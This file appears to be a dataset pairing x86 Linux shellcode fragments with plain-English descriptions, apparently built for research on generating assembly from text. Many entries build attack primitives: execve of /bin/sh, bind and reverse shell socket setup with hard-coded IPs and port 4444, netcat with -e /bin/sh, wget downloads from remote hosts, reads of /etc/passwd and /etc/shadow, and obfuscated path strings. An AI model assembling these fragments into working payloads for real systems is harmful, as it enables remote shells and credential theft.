push byte 1 \n mov eax, esp	push the byte 1 onto the stack and point eax to the stack register
push byte 1 \n pop eax	load exit syscall into eax register
push byte 1 \n pop eax	load __nr_execve syscall into eax register
push byte 1 \n pop eax	put the syscall 1 into the eax register
push byte 1 \n pop eax \n int 0x80	load syscall exit in al register and call kernel
push byte 10	push the byte 10 onto the stack
push byte 10	push the byte 10 to the stack
push byte 10 \n pop eax	put the syscall 10 into the eax register
push byte 11	push the byte 11 onto the stack
push byte 11	push the byte 11 to the stack
push byte 11 \n pop eax	put the syscall 11 into the eax register
push byte 15	push the byte 15 onto the stack
push byte 15	push the byte 15 to the stack
push byte 15 \n pop eax	move the function chmod in al register
push byte 15 \n pop eax	put the syscall 15 into the eax register
push byte 16	push byte 16 onto stack
push byte 16	push the byte 16 onto the stack
push byte 16 \n pop eax	put the syscall 16 into the eax register
push byte 16 \n push ecx \n push edi	push 16, *ptr and file descriptor on stack
push byte 17h	push the byte 17h onto the stack
push byte 17h \n pop eax	put the syscall 17h into the eax register
push byte 2	push byte 2 onto the stack
push byte 2	push the byte 2 onto the stack
push byte 2 \n pop eax	put the syscall 2 into the eax register
push byte 2 \n pop ecx	load byte 2 into ecx register
push byte 2 \n pop ecx	save the byte 2 into ecx register
push byte 2 \n pop edx	load the byte 2 into edx register
push byte 2 \n push esi	push the byte 2 and esi content on stack
push byte 25	push the byte 25 onto the stack
push byte 25 \n pop eax	put the syscall 25 into the eax register
push byte 28	push the lenght of sockaddr_in6 = 28 byte
push byte 28	push the byte 28 to the stack
push byte 28 \n pop eax	put the syscall 28 into the eax register
push byte 3 \n mov ebx, esp	push the byte 3 onto the stack and point ebx to the stack register
push byte 37	push the byte 37 onto the stack
push byte 37 \n pop eax	put the syscall 37 into the eax register
push byte 3h	push the byte 3h onto the stack
push byte 3h \n pop eax	put the syscall 3h into the eax register
push byte 4	push the byte 4 onto the stack
push byte 4 \n pop eax	load byte 4 into eax register
push byte 4 \n pop eax	load __nr_write into eax
push byte 4 \n pop eax	put the syscall 4 into the eax register
push byte 49	push the byte 49 onto the stack
push byte 49 \n pop eax	put the syscall 49 into the eax register
push byte 5	push 5 on stack
push byte 5	push the byte 5 onto the stack
push byte 5 \n pop eax	load byte 5 into eax register
push byte 5 \n pop eax	load __nr_open into eax register
push byte 5 \n pop eax	put the syscall 5 into the eax register
push byte 54	push the byte 54 onto the stack
push byte 54 \n pop eax	put the syscall 54 into the eax register
push byte 6	push byte 6 onto the stack
push byte 6	push the byte 6 onto the stack
push byte 6	push the byte 6 to the stack
push byte 6 \n pop eax	put the syscall 6 into the eax register
push byte 6 \n push byte 0x1 \n push byte 10	push the byte 6, 0x1 and 10 on stack
push byte 67	push the byte 67 onto the stack
push byte 67 \n pop eax	load sigaction syscall number into eax register
push byte 67 \n pop eax	put the syscall 67 into the eax register
push byte 70	push the byte 70 onto the stack
push byte 70 \n pop eax	put the syscall 70 into the eax register
push byte 8	push the byte 8 onto the stack
push byte 8 \ n pop eax	load __nr_creat into al register
push byte 8 \n pop eax	put the syscall 8 into the eax register
push byte 9	push the byte 9 onto the stack
push byte 9 \n pop eax	put the syscall 9 into the eax register
push byte chmod_call	push the byte chmod_call onto the stack
push byte chmod_call \n pop eax	move the function chmod in al register
push byte CHMOD_CALL \n pop eax	put the byte my_label into the eax register
push byte CHMOD_CALL \n pop eax	put the byte CHMOD_CALL into the eax register
push byte L1 \n pop eax	put the byte L1 into the eax register
push byte my_value \n pop eax	put the byte my_value into the eax register
push byte VALUE \n pop eax	put the byte VALUE into the eax register
push cx	push the contents of the cx register onto the stack
push dword [ebp+16]	push the dword [ebp+16] onto the stack
push dword [edx+2]	push the double word stored a edx+2 location on stack
push dword [edx+2]	push the doubleword [edx+2] to the stack
push dword [edx+2]	push the dword [edx+2] onto the stack
push dword 0x00000000	push the doubleword 0x00000000 onto the stack
push dword 0x0101017f	push the dword 0x0101017f onto the stack
push dword 0x017aa8c0	push the dword 0x017aa8c0 onto the stack
push dword 0x0501a8c0	push the value of local ip = 192.168.1.5 on stack
push dword 0x0501a8c0	push the dword 0x0501a8c0 onto the stack
push dword 0x0a206873	push the double word 0x0a206873 onto the stack
push dword 0x10	push the dword 0x10 onto the stack
push dword 0x2	push the double word 2 onto the stack
push dword 0x214c4f4c	push the dword 0x214c4f4c onto the stack
push dword 0x2335738c	push the double word 0x2335738c onto the stack
push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov eax, esp	push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the eax register to the stack register
push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov ebx, esp	push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ebx register to the stack register
push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov ecx, esp	push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ecx register to the stack register
push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov edx, esp	push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the edx register to the stack register
push dword 0x2f2f6e69	push the dword 0x2f2f6e69 onto the stack
push dword 0x2f2f6e69	push the doubleword 0x2f2f6e69 to the stack
push dword 0x2f3a2f3a	push the double word 0x2f3a2f3a onto the stack
push dword 0x2f3a3a30	push the dword 0x2f3a3a30 onto the stack
push dword 0x2f6e6962	push the double word 0x2f6e6962 onto the stack
push dword 0x303a3a31	push the double word 0x303a3a31 onto the stack
push dword 0x313a303a	push the double word 0x313a303a onto the stack
push dword 0x39396e2d \n mov ebp, esp	push double word 0x39396e2d onto the stack and point the ebp register to the stack register
push dword 0x39396e2d \n mov ebx, esp	push double word 0x39396e2d onto the stack and point the ebx register to the stack register
push dword 0x39396e2d \n mov edi, esp	push double word 0x39396e2d onto the stack and point the edi register to the stack register
push dword 0x39396e2d \n mov esi, esp	push double word 0x39396e2d onto the stack and point the esi register to the stack register
push dword 0x3a303a3a	push the dword 0x3a303a3a onto the stack
push dword 0x4227a28b	push the doubleword 0x4227a28b onto the stack
push dword 0x45525649	push the dword 0x45525649 onto the stack
push dword 0x58494741	push the dword 0x58494741 onto the stack
push dword 0x5f657a69	push the dword 0x5f657a69 onto the stack
push dword 0x6164732f	push the dword 0x6164732f onto the stack
push dword 0x61702f2f	push the dword 0x61702f2f onto the stack
push dword 0x61702f63	push the dword 0x61702f63 onto the stack
push dword 0x61722f6c	push the dword 0x61722f6c onto the stack
push dword 0x61747069	push the doubleword 0x61747069 to the stack
push dword 0x61747069	push the dword 0x61747069 onto the stack
push dword 0x62732f2f	push the dword 0x62732f2f onto the stack
push dword 0x62732f2f	push the doubleword 0x62732f2f to the stack
push dword 0x62732f2f \n mov ebx, esp	push the doubleword 0x62732f2f onto the stack and point the ebx register to the stack register
push dword 0x6374652f	push the dword 0x6374652f onto the stack
push dword 0x64616568	push the dword 0x64616568 onto the stack
push dword 0x64777373	push the dword 0x64777373 onto the stack
push dword 0x6567772f \n push dword 0x6e69622f \n push dword 0x7273752f \n mov ebx, esp	push edx, the byte +0x74 and the chined double words ‘/usr/bin/wge’ into ebx register
push dword 0x656e7265	push the dword 0x656e7265 onto the stack
push dword 0x682f6365 \n push dword 0x78652f2f \n push dword 0x6f692e62 \n push dword 0x75687469 \n push dword 0x672e6d34 \n push dword 0x626d3362	push the string ‘b3mb4m.github.io//exec/h’ on stack as chained double words
push dword 0x68732f2f	push hs// onto stack
push dword 0x68732f2f	push the dword 0x68732f2f onto the stack
push dword 0x68732f63	push the dword 0x68732f63 onto the stack
push dword 0x68732f6e	push the dword 0x68732f6e onto the stack
push dword 0x69622f2f	push the dword 0x69622f2f onto the stack
push dword 0x69622f3a	push the dword 0x69622f3a onto the stack
push dword 0x6962732f	push the dword 0x6962732f onto the stack
push dword 0x6b2f7379	push the dword 0x6b2f7379 onto the stack
push dword 0x6b6e756a	push the dword 0x6b6e756a onto the stack
push dword 0x6d6f646e	push the dword 0x6d6f646e onto the stack
push dword 0x6e69622f	push nib/ onto stack
push dword 0x6e69622f	push the dword 0x6e69622f onto the stack
push dword 0x6e69922f	push the dword 0x6e69922f onto the stack
push dword 0x6f702f6e	push the dword 0x6f702f6e onto the stack
push dword 0x6f726577	push the dword 0x6f726577 onto the stack
push dword 0x7264632f	push the dword 0x7264632f onto the stack
push dword 0x72657355	push the dword 0x72657355 onto the stack
push dword 0x732f636f	push the dword 0x732f636f onto the stack
push dword 0x73656c62	push the doubleword 0x73656c62 to the stack
push dword 0x73656c62	push the dword 0x73656c62 onto the stack
push dword 0x73656c62 \n push dword 0x61747069 \n mov edi,esp \n push dword 0x2f2f6e69 \n push dword 0x62732f2f \n mov ebx, esp	load the string iptables in edi regsiter and load the string //sbin // in ebx regsiter
push dword 0x7461632f	push the dword 0x7461632f onto the stack
push dword 0x74652f2f	push the dword 0x74652f2f onto the stack
push dword 0x74652f2f \n mov eax, esp	push double word 0x74652f2f onto the stack and point the eax register to the stack register
push dword 0x74652f2f \n mov ebp, esp	push double word 0x74652f2f onto the stack and point the ebp register to the stack register
push dword 0x74652f2f \n mov ebx, esp	push double word 0x74652f2f onto the stack and point the ebx register to the stack register
push dword 0x74652f2f \n mov ecx, esp	push double word 0x74652f2f onto the stack and point the ecx register to the stack register
push dword 0x74652f2f \n mov edx, esp	push double word 0x74652f2f onto the stack and point the edx register to the stack register
push dword 0x74652f2f \n mov esi, esp	push double word 0x74652f2f onto the stack and point the esi register to the stack register
push dword 0x7665642f	push the dword 0x7665642f onto the stack
push dword 0x776f6461	push the dword 0x776f6461 onto the stack
push dword 0x8140a8c0	push ipv4 address 192.168.64.129 (hex) on stack
push dword 0x8140a8c0	push the doubleword 0x8140a8c0 to the stack
push dword eax	push the double word content of eax on stack
push dword eax	push the doube word eax content on stack
push dword eax	push sin6_addr as dword eax
push dword eax	push the doubleword eax to the stack
push dword eax	push the dword eax onto the stack
push dword eax \n push dword eax	push the double word eax content on stacck two times
push dword eax \n push dword eax \n push dword eax \n push dword eax	push 4 times dword contained in eax that represent ipv6 loopback
push dword eax \n push dword eax \n push dword eax \n push dword eax	push ipv6 loopback on stack as x4 dword eax
push dword eax \n push dword eax \n push dword eax \n push dword eax	push eax content as double word for 4 times
push dword eax \n push dword eax \n push dword eax \n push dword eax \n push dword eax	push the string v6_host.sin6_addr on stack
push dword ebx	push sin6_flowinfo=4 byte saved in ebx on stack
push dword ebx	push the doubleword ebx to the stack
push dword ebx \n push dword ebx	push ebx content as a double word on stack two times
push dx	push dx rergister on the stack
push dx	push dx content on stack
push dx	push dx onto the stack
push eax	push eax onto stack
push eax	push eax on the stack
push eax	push eax contents on the stack
push eax	push null terminating string on stack
push eax	push null
push eax	push eax content on the stack
push eax	push zero on the stack
push eax	push eax content on stack
push eax	push in eax the argument no=0
push eax	push sin6_addr = in6addr_any = ::0
push eax	push zero on stack
push eax	push null terminator on stack
push eax	push eax(socket file descriptor) onto stack
push eax	push nulls for string termination
push eax	push null byte as string terminator
push eax	push null into the stack
push eax	push null on stack
push eax	move 0 to stack (protocol=0)
push eax	push 0 (=eax)
push eax	push ipproto_ip = 0 (eax) on stack
push eax	push sin6_addr, saved in eax, on stack
push eax	push null byte on stack
push eax	push null terminator
push eax	preserve eax on the stack
push eax	push eax onto the stack
push eax	push eax to the stack
push eax	push eax value to the stack
push eax	push the contents of eax onto the stack
push eax	push the contents of eax register onto the stack
push eax	push the contents of the eax register onto the stack
push eax	push the value of register eax onto the stack
push eax \n inc eax	push eax on stack then increment its conent
push eax \n mov ebx, esp	push the contents of the eax register onto the stack and point ebx to the stack register
push eax \n mov ecx, esp	push the contents of the eax register onto the stack and point ecx to the stack register
push eax \n mov edi, 0x343997b7 \n rol edi, 1 \n push edi \n mov esi, 0xd2c45e5e \n ror esi, 1 \n push esi	push null terminating string and ‘/bin/sh’ to the stack
push eax \n mov edx, esp	clear edx
push eax \n mov edx, esp	push null in the edx position
push eax \n mov edx, esp	clear eax register
push eax \n mov edx, esp	envp = 0
push eax \n mov edx, esp	load eax into edx register
push eax \n mov edx, esp	push the contents of the eax register onto the stack and point edx to the stack register
push eax \n mov edx, esp \n push eax \n mov ecx, esp	insert null in edx and ecx
push eax \n mov edx, esp \n push eax \n mov ecx, esp	zero out edx and ecx register
push eax \n mov edx, esp \n push ebx \n mov ecx, esp \n mov al, 0xb \n int 0x80	execute __nr_execve syscall
push eax \n mov edx,esp	push null temrinating string on edx
push eax \n pop ecx	move eax by inserting it in the stack in ecx extracting it from the stack
push eax \n pop edi	load 0 into edi register
push eax \n pop edx	transfer eax contents into edx register
push eax \n pop edx	load eax content into edx
push eax \n push 0x30	push eax and the hexadecimal value 0x30 on the stack
push eax \n push 0x31373737 \n push 0x3170762d \n mov esi, esp	load chained null and the arg -vp17771 into esi register
push eax \n push 0x35353535 \n push 0x70746c2d \n mov ecx, esp	push 0, port number = 5555, command -ltp on stack. ecx point to the top pf the stack.
push eax \n push 0x39393939 \n push 0x39706c2d	push 0-term, 9999, 9pl- on the stack
push eax \n push 0x4b434148	push null terminated string ‘hack’ on stack
push eax \n push 0x636e2f2f \n push 0x6e69622f \n mov ebx, esp	load chained null and the arg /bin//nc into ebx register
push eax \n push 0x636e2f6e \n push 0x69622f2f	push 0-term, cn/n, ib// on the stack
push eax \n push 0x6769666e \n push 0x6f635f64 \n push 0x6873732f \n push 0x6873732f \n push 0x6374652f	push 0-term, gifn, oc_d, hss/, hss/, cte/ on the stack
push eax \n push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	load ‘/bin//sh\0’ intp ebx register
push eax \n push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	load ‘/bin//sh\0’ into ebx register
push eax \n push 0x68732f2f \n push 0x6e69622f \n push 0x2f656c2d \n mov edi, esp	load chained null and the arg -le//bin//sh into edi register
push eax \n push 0x68732f2f \n push 0x6e69622f \n push 0x2f656c2d \n mov edx, esp	load chained null and the arg -le//bin//sh into edx register
push eax \n push 0x68732f2f \n push 0x6e69622f \n push ebx, esp \n mov edx, eax \n mov al, 0xb \n int 0x80	execute execve syscall putting null temrinated string ‘/bin//sh’ into ebx register, the parameter 0 into edx and the syscall code into al register.
push eax \n push 0x68732f6e \n push 0x69622f2f \n mov ebx, esp	load the string //bin/sh\0 into ebx regsiter
push eax \n push 0x68736162 \n push 0x2f6e6962 \n push 0x2f2f652d	push 0-term, hsab, /nib, //e- on the stack
push eax \n push 0x6c6c6568 \n push 0x2f6d3462 \n push 0x6d33622f \n push 0x2f2f2f6d \n push 0x6f632e73 \n push 0x616d6978 \n push 0x656d2e33 \n mov ecx, esp	save null terminated string ‘3.meximas.com////b3mb4m/hell’ into ecx register
push eax \n push 0x7361642f \n push 0x6e69622f \n mov ebx, esp	load null terminate string ‘/bin/das’ into ebx regsiter
push eax \n push 0x7461632f \n push 0x6e69622f	push 0-term, tac/, nib/ on the stack
push eax \n push 0x74656777 \n push 0x2f6e6962 \n push 0x2f727375 \n push 0x2f2f2f2f \n mov ebx, esp	load null terminated string ‘////usr/bin/wget’ intp ebx regsiter
push eax \n push 0x746f6f62 \n push 0x65722f6e \n push 0x6962732f \n mov ebx, esp	load null temrinated string ‘/sbin/reboot’ into ebx register
push eax \n push 0x746f6f62 \n push 0x65722f6e \n push 0x6962732f \n mov ebx, esp	load null terminated string ‘sbin/reboot’ into ebx register
push eax \n push byte +0x68 \n mov ebx,esp	load eax content and the byte +0x68 into ebx register
push eax \n push byte 0x1 \n push byte 0x2	push the parameters (0, sock_stream =1, af_inet=2) on stack
push eax \n push byte 0x1 \n push byte 0x2 \n mov ecx, esp	push the protocol 0, the type, sock_stream, and the domain af_inet on the stack and then load the stack pointer into ecx register
push eax \n push dword 0x39396e2d	put 0-term and the word 99n- on stack
push eax \n push dword 0x64616568 \n push dword 0x2f6e6962 \n push dword 0x2f2f2f2f \n push dword 0x7273752f	put 0-term and the double words daeh, /nib, ////, rsu/ on the stack
push eax \n push dword 0x64777373 \n push dword 0x61702f63 \n push dword 0x74652f2f	put 0-term, dwss, ap/c, te// on stack
push eax \n push eax	push eax content on the stack 2 times
push eax \n push eax	push null two times on stack
push eax \n push eax \n push ecx \n push ebx \n mov ecx, esp	load eax two times, ecx and ebx into ecx register
push eax \n push ebp \n push edi \n \n push esi \n push ebx	push eax, ebp, edi, esi, ebx on the stack
push eax \n push ebx	push eax and ebx content on stack
push eax \n push ebx	push ebx and eax on stack
push eax \n push ebx	push eax and ebx contents on stack
push eax \n push ebx \n mov ecx, esp	load eax and ebx contents chained into ecx register
push eax \n push ecx \n push ebx	push eax,ecx and ebx contents on stack
push eax \n push ecx \n push esi \n mov ecx,esp	push eax, ecx and esi on the stack and then load the stack pointer in ecx register
push eax \n push edi	push eax and edi contents on the stack
push eax \n push edi \n push esi \n push ebx	push 0-term, the args in edi, the args in esi and the pointer to /user////bin/head on the stack
push eax \n push edi \n push esi \n push ebx \n mov ecx, esp	load eax, edi, esi, ebx contents into ecx register
push eax \n push edi \n push esi \n push ebx \n mov ecx, esp	chain the register eax,edi, esi, ebx and load the contents on ecx register
push eax \n push edi \n push esi \n push ebx \n mov ecx, esp	concatenate the content of eax, edi, esi, ebx and load them into ecx register
push eax \n push edx	push eax and edx on the stack
push eax \n push edx	push eax and edx contents on stack
push eax \n push edx \n push ecx \n push ebx \n mov edi, esp	load eax, edx, ecx and ebx contents chanined into edi register
push eax \n push edx \n push esi \n push ebx	push eax, edx, esi, ebx contents on the stack
push eax \n push esi \n push ebx	push eax, esi and bx contents on the stack
push eax \n push esi \n push edi \n push ebx	push eax, esi, edi and ebx contents on stack
push eax \n push esp	push eax and esp register on the stack
push eax \n push word 0x6873 \n push 0x61622f2f \n push 0x6e69622f \n mov ebx,esp	load the string “/bin//bash\0” into ebx register
push eax \n xor eax, eax \n mov al, 1	push eax register on the satck than clear it and put the number of the syscall exit in its laast byte
push ebp	save old base pointer
push ebp	save the old base pointer value
push ebp	push the contents of the ebp register onto the stack
push ebp	push the ebp onto the stack
push ebp	push ebp onto the stack
push ebx	insert ebx on the stack
push ebx	push ebx on the stack
push ebx	push ebx content on the stack
push ebx	push ebx content i on the stack
push ebx	push the command to run on stack
push ebx	push backlog value equals to 2 on stack
push ebx	push ebx content on stack
push ebx	push 0 on stack
push ebx	push the sock file descriptor stored in ebx
push ebx	"push ""/bin/sh"" on stack"
push ebx	push ebx(0) onto stack (ipproto_ip = 0)
push ebx	push ebx(1) onto stack (sock_stream = 1)
push ebx	push the string ‘////bin/bash’ on tsack
push ebx	push the pointer to /bin/bash
push ebx	push ptr addr on stack
push ebx	push pointer
push ebx	value in ebx=1 is pushed in to the stack (sock_stream =1)
push ebx	pushe 0 onto the stack for first arg of inaddr_any for the local host
push ebx	pushes the 2nd arg for connection que size to 0
push ebx	pushes the memory address of the string onto the stack
push ebx	push ebx on stack
push ebx	push address of /bin/sh
push ebx	preserve ebx on the stack
push ebx	push the contents of ebx register onto the stack
push ebx	push the contents of the ebx register onto the stack
push ebx	push the ebx value to the stack
push ebx	push ebx onto the stack
push ebx	push the contents of ebx onto the stack
push ebx	push ebx to the stack
push ebx \n inc ebx \n push ebx	push ebx on stack, increment its content by1 and push it again on stack
push ebx \n mov eax, esp	push the contents of the ebx register onto the stack and point eax to the stack register
push ebx \n mov ecx, esp	push ebx in the stack and then move its contents into ecx register
push ebx \n mov ecx, esp	move the character x from ebx register to ecx register
push ebx \n mov ecx, esp	"moving the pointer to ""/bin//sh"" to ecx"
push ebx \n mov ecx, esp	load ebx into ecx register
push ebx \n mov ecx, esp	push the contents of the ebx register onto the stack and point ecx to the stack register
push ebx \n mov ecx,esp	push ebx content on the satck and load it into ecx register
push ebx \n mov edx, esp	push the contents of the ebx register onto the stack and point edx to the stack register
push ebx \n pop ecx	load ebx content into ecx register
push ebx \n push 0x1 \n push 0xa	push on stack the arguemnts ip_proto = 0, sock_stream =1, pf_inet6 = 10
push ebx \n push 0x4	push ebx and the value 0x4 on stack
push ebx \n push 0x6 \n pop eax	load ebx content concatenating with hexadecimal value 0x6 into eax reister
push ebx \n push byte 10	push ebx contente and the byte 10 on stack
push ebx \n push ebx	push null on stack two times
push ebx \n push ebx	push 0 two times
push ebx \n push ebx \n push esi	push ebx two times and esi content on stack
push ebx \n push ebx \n push esi	push ebx two times andesi contents on stack
push ebx \n push ecx	push ebx and ecx contents on stack
push ecx	push null in stack
push ecx	push ecx on the satck
push ecx	load the real ip address in the stack
push ecx	push ecx content on the stack
push ecx	push ecx on stack
push ecx	push the pointer v4lhost on stack
push ecx	push the pointer to struct on stack
push ecx	push the pointer to sockfd on stack
push ecx	push null on stack
push ecx	push the pointer to host_sockfd
push ecx	push ecx on register
push ecx	push null terminating string on stack
push ecx	push the pointer to sock addr stored in ecx
push ecx	push ecx(struct pointer) onto the stack
push ecx	push \x00 to the stack
push ecx	push pointer address on stack
push ecx	push serv_addr saved in ecx
push ecx	push struct pointer
push ecx	push the memory location of previous args onto the stack
push ecx	push ecx content on stack
push ecx	push &serv_addr saved in ecx
push ecx	preserve ecx on the stack
push ecx	push the contents of the ecx register onto the stack
push ecx	push the value of register ecx onto the stack
push ecx	push ecx onto the stack
push ecx	push the contents of ecx register onto the stack
push ecx	push the ecx onto the stack
push ecx	push ecx on the stack
push ecx	push ecx to the stack
push ecx	push the contents of the ecx register onto the stack.
push ecx \n mov ecx,esp	push ecx on the stack and then place pointer to ecx
push ecx \n mov edx,esp	push ecx on the stack and then place pointer to edx
push ecx \n pop edi	load ecx contents into edi register
push ecx \n push 0x2 \n push 0x2	push ecx content, the value 0x2 two times on stack
push ecx \n push 0x64777373 \n push 0x61702f2f \n push 0x6374652f \n mov ecx,esp	load ‘/etc//passwd’ and null teminating string into ecx register
push ecx \n push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	load ‘/bin//sh\0’ on ebx register
push ecx \n push 0x68732f2f \n push 0x6e69622f \n mov ebx,esp	push the string /bin//sh\0\0\0\0\0\0\0\0 on the stack and place pointer to eb
push ecx \n push 0x68736162 \n push 0x2f6e6962 \n push 0x2f2f2f2f	push ecx cotent, ‘hsab’, ‘/nib’ and ‘////’ on stack
push ecx \n push 0x7461632f \n push 0x6e69622f \n mov ebx,esp	load ‘/bin/cat’ and null teminating string into ebx register
push ecx \n push 0x8 \n push edx \n push esi \n mov ecx, esp	load ecx content, hexadecimal value 0x8, edx content, esi content into ecx register
push ecx \n push 0xb \n pop eax \n push 0x68732f2f \n push 0x6e69622f \n mov ebx,esp	load __nr_execve syscall into eax register and the string ‘/bin//sh\0’ into ebx register
push ecx \n push dword 0x68732f2f \n push dword 0x6e69622f \n mov ebx, esp	load ‘/bin//sh\0’ into ebx register
push ecx \n push eax	push the pointer to sockaddr and the fd received previously on stack
push ecx \n push ebx	push ecx and ebx content on stack
push ecx \n push ebx \n mov ecx,esp	load the string /usr/bin/wget 192.168.1.93//x </dev/null2<&1 in ecx register
push ecx \n push ebx \n pop ebx	save null terminating string ‘/bin/sh’ into ebx
push ecx \n push ebx \n push dword 0x2 \n mov ecx, esp	push ecx and ebx contents and 32 bit equal to 2 on the stack and then put esp in ecx
push ecx \n push ecx \n push esi	push the value 0 to the stack for 2 times and then push esi
push ecx \n push esi	push ecx and esi contents on the stack
push ecx \n push esi	push ecx and esi contents on stack
push ecx \n push esi	push ecx and esi contents
push ecx \n push word 0x5c11 \n push word 0x2 \n mov ecx, esp	load ecx content, af_inet in 32bit and the 32bit value 4444 on ecx
push edi	push nib// in stack
push edi	push the string //sbin// on the stack
push edi	push edi content on the stack
push edi	"push ""c-"" on stack"
push edi	push edi content
push edi	push ‘-c’ value on stack
push edi	push the edi onto the stack
push edi	push edi to the stack
push edi	push the contents of the edi register onto the stack
push edi	push edi onto the stack
push edi	push the contents of edi register onto the stack
push edi \n mov eax, esp	push the contents of the edi register onto the stack and point eax to the stack register
push edi \n mov ebx, esp	push the contents of the edi register onto the stack and point ebx to the stack register
push edi \n mov ecx, esp	push the contents of the edi register onto the stack and point ecx to the stack register
push edi \n mov edx, esp	push the contents of the edi register onto the stack and point edx to the stack register
push edi \n pop esi	load esi content into esi register
push edi \n push word 100 \n push edi \n push esi	push edi content, the buffer size = 100 as a word, edi content and socketfd (esi) on stack
push edx	push edx register on the stack
push edx	push null on the stack
push edx	push null byte on the stack
push edx	load null byte on the stack
push edx	push edx on stack
push edx	push inaddr_any = 0 on the stack
push edx	push null string terminator on stack
push edx	push null argv on stack
push edx	push edx contet om stack
push edx	push edx content on stack
push edx	push null on stack
push edx	push terminating null on stack
push edx	push edx(0) onto the stack (inaddr_any = 0)
push edx	push 00 onto the stack
push edx	push null termination string on stack
push edx	push file descriptor on stack
push edx	push protocol id = 0
push edx	push socket file descriptor saved in edx
push edx	push null
push edx	push 0 on to stack (inaddr_any)
push edx	push 0 onto stack (backlog=0)
push edx	pushes the old socket fd onto the stack
push edx	push current socket fd onto the stack
push edx	push the socket fd onto the stack
push edx	push our socket fd onto the stack
push edx	push edx content
push edx	push edx
push edx	push inaddr_any = 0
push edx	push zero addrlen on stack
push edx	push null sockaddr on stack
push edx	preserve edx on the stack
push edx	push edx to the stack
push edx	push the contents of edx register onto the stack
push edx	push the contents of the edx register onto the stack
push edx	push the value of register edx onto the stack
push edx	push edx onto the stack
push edx	push edx on the stack
push edx \n mov eax, 0xb33fb33f \n sub eax, 0x3bd04ede \n push eax	push null terminated string ‘adow’ on stack
push edx \n mov eax, esp	push the contents of the edx register onto the stack and point eax to the stack register
push edx \n mov ebx, esp	push the contents of the edx register onto the stack and point ebx to the stack register
push edx \n mov ecx, esp	push the contents of the edx register onto the stack and point ecx to the stack register
push edx \n push 0x6563726f \n push 0x666e6574 \n push 0x65732f6e \n push 0x6962732f \n push 0x7273752f	push null termination string and the string ‘/usr/sbin/setenforce’ on the stack
push edx \n push 0x68732f2f \n push 0x6e69622f	push null terminated /bin//sh on stack
push edx \n push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	push /bin//sh +\x00 on the stack and then point ebx where that string is located
push edx \n push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	load null bytes, ‘//sh’ and ‘/bin’ into ebx register
push edx \n push 0x68732f2f \n push 0x6e69622f \n mov ebx,esp	load ‘/bin//sh\0’ into ebx register
push edx \n push 0x68735858	push edx and the hexadecimal value 0x68735858 on the stack
push edx \n push byte 0x30	push edx and the value 0x30 onto the stack
push edx \n push byte 0x77 \n push word 0x6f64 \n mov esi, 0x222933f0 \n add esi, 0x3f3f3f3f \n push esi \n xor esi, esi \n mov esi, 0x243525f0 \n add esi, 0x3f3f3f3f \n push esi \n xor esi, esi \n mov ebx, esp	load the string /cte/shadow on ebx register
push edx \n push eax \n push ebx	push edx, eax and ebx on the stack
push edx \n push ebx	push edx and ebx content on stack
push edx \n push ebx	push edx content two times on stack
push edx \n push ebx \n push 2	pusg protocol = 0, sock_stream = 1 and af_inter = 2 on stack
push edx \n push ecx \n push eax	push edx, ecx and eax contents on stack
push edx \n push ecx \n push ebx	push edx, ecx and ebx content on stack
push edx \n push ecx \n push ebx \n mov ecx, esp	push edx, ecx and ebx contents on the stack
push edx \n push ecx \n push ebx \n push eax \n push esp \n push ebp \n push esi \n push edi	push edx, ecx, ebx, eax, esp, ebp, esi and edi registers on the stack
push edx \n push edi	push edx and edi on stack
push edx \n push edi \n push ebx	push edx, edi and ebx content on stack
push edx \n push edx	push null two times on satck
push edx \n push edx \n mov ecx, esp	push two times edx on the stack and then load the stack pointer in ecx register
push edx \n push edx \n push esi	push edx content two times and esi content on stack
push edx \n push edx \n push esi	push edx content two times and esi content onto the stack
push edx \n push edx \n push esi \n mov ecx, esp	push edx two times ad esi on the stack and then load the stack pointer into ecx register
push edx \n push esi	push edx and esi content on stack
push edx \n push esi \n mov ecx, esp	save 0 and socket file descriptor in ecx
push edx \n push esi \n mov ecx, esp	save socket file descriptor and 0 in ecx
push edx \n push esi \n mov ecx, esp	push edx and esi contents on the stack and then load the stack pointer into ecx register
push edx \n push esi \n push ebp \n push ebx \n mov ecx, esp	load edx, esi, ebp and ebx contentsinto ecx register
push edx \n push esi \n push edi \n push ebx \n mov ecx, esp	chain the contents of the registers edx, esi, edi and ebx and save them into ecx register
push edx \n push word 0x5c11 \n push word 0x02 \n mov ecx, esp	save af_inet in 32bit, the 32bit value 4444, edx contents on ecx
push edx \n push word 0x8223 \n push word bx	push on stack the word array : [0, port_num, 2]
push edx \n push word 0xaaaa \n push word 2 \n mov ecx, esp	push a word null, a word of a characters and a word of 2 on the stack then load the stack pointer into ecx register
push esi	push hs/ in stack
push esi	push the pointer to -f
push esi	push esi content on stack
push esi	push the socket file descriptor on stack
push esi	push socket file descriptor on stack
push esi	push the sockfd on stack
push esi	push the host_sockfd
push esi	push the pointer to host_sockfd stored in esi on stack
push esi	push host_sockfd
push esi	push encoded_shellcode pointer to stack for later execution
push esi	push null termination
push esi	push the pointer to the /tmp/.xe
push esi	push file descriptor on stack
push esi	push sockfd (sock_file_des) onto stack
push esi	push sockfd on stack
push esi	push sockfd saved into esi
push esi	push sockfd (esx) on stack
push esi	preserve esi on the stack
push esi	push the contents of the esi register onto the stack
push esi	push the contents of the esi register onto the stack.
push esi	push the esi onto the stack
push esi	push esi onto the stack
push esi	push the contents of esi register onto the stack
push esi	push esi on the stack
push esi	push esi to the stack
push esi	push the encoded shellcode pointer to stack
push esi \n mov eax, esp	push the contents of the esi register onto the stack and point eax to the stack register
push esi \n mov ebx, esp	push the contents of the esi register onto the stack and point ebx to the stack register
push esi \n mov ecx, esp	push the contents of the esi register onto the stack and point ecx to the stack register
push esi \n mov edi, esi	push the stack onto esi and move the contents on edi
push esi \n mov edx, esp	push the contents of the esi register onto the stack and point edx to the stack register
push esi \n push 0x68732f2f \n push 0x6e69622f	push null terminated string ‘/bin//sh’ on stack
